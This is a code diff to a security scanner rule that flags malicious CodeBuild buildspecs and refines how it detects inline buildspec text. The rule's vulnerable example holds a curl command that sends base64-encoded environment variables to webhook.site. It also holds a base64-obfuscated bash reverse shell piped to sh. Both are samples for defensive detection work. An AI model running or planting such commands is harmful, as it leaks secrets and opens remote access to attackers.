@@ -45,14 +45,13 @@ RULE = Rule(
     exploit_example=(
         "# Vulnerable: the project's buildspec carries indicators\n"
         "# of malicious activity — base64-decoded execution, exfil\n"
-        "# to webhook.site, miner binaries. Either the buildspec\n"
-        "# was poisoned via UpdateProject (CB-008) or pulled from\n"
-        "# a compromised repo.\n"
+        "# to webhook.site. Either the buildspec was poisoned via\n"
+        "# UpdateProject (CB-008) or pulled from a compromised repo.\n"
         "# (current buildspec source)\n"
         "phases:\n"
         "  build:\n"
         "    commands:\n"
-        "      - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "      - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
         "      - curl https://webhook.site/abc?env=$(env|base64)\n"
         "\n"
         "# Safe: the buildspec does only what the build needs.\n"
@@ -77,9 +76,14 @@ def check(catalog: ResourceCatalog) -> list[Finding]:
         buildspec = source.get("buildspec") or ""
         if not isinstance(buildspec, str) or not buildspec.strip():
             continue
-        # Only inline buildspecs have text to scan; a path like
-        # ``ci/build.yml`` is a file reference the scanner can't read.
-        if "\n" not in buildspec and not buildspec.startswith(("version:", "phases:")):
+        # Only inline literal buildspec content has text to scan. A repo
+        # path (``ci/build.yml``) or an S3 URL is an external reference the
+        # scanner can't read. Inline content is multi-line YAML, a YAML
+        # block, or single-line JSON (the shape the API emits inline).
+        text = buildspec.strip()
+        if text.startswith(("arn:aws:s3:::", "s3://")):
+            continue
+        if "\n" not in text and not text.startswith(("version:", "phases:", "{")):
             continue
         hits = find_malicious_patterns(buildspec.lower())
         if not hits:
